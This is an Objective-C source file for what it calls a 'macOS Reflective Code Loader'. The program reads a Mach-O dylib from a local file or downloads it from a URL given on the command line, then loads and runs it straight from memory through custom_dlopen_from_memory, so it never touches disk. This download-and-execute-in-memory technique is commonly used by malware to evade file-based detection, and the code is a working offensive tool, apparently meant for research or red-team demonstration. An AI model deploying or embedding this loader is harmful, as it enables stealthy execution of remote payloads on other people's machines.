//
//  main.m
//  customLoader
//

#import <stdio.h>
#import <stdlib.h>
#import <Foundation/Foundation.h>

#import "custom_dlfcn.h"

int main(int argc, const char * argv[]) {

    void* handle = NULL;
    NSData* payload = nil;
    
    if(argc != 2)
    {
        printf("ERROR: please specify path/url to dylib (to load and execute from memory)\n\n");
        return -1;
    }
    
    printf("\nmacOS Reflective Code Loader\n");
    printf("(note: payload must be a mach-O bundle/framework/dylib (that does not use LC_DYLD_CHAINED_FIXUPS))\n\n");
    
    sleep(0.5);
    
    if(strncmp(argv[1], "http", strlen("http")) == 0) {
        
        NSURL* url = nil;
        printf("[+] downloading from remote URL...\n");
        
        url = [NSURL URLWithString:[NSString stringWithUTF8String:argv[1]]];
        payload = [NSData dataWithContentsOfURL:url];
    
    } else {
        
        NSString* path = nil;
        printf("[+] loading from file...\n");
        
        path = [NSString stringWithUTF8String:argv[1]];
        payload = [NSData dataWithContentsOfFile:path];
    }
    
    printf("    payload now in memory (size: %lu), ready for loading/linking...\n", static_cast<unsigned long>(payload.length));
    
    printf("\nPress any key to continue...\n");
    getchar();
    
    handle = custom_dlopen_from_memory((void*)payload.bytes, (int)payload.length);
    
    printf("\nDone!\nPress any key to exit...\n");
    getchar();
   
    return 0;
}
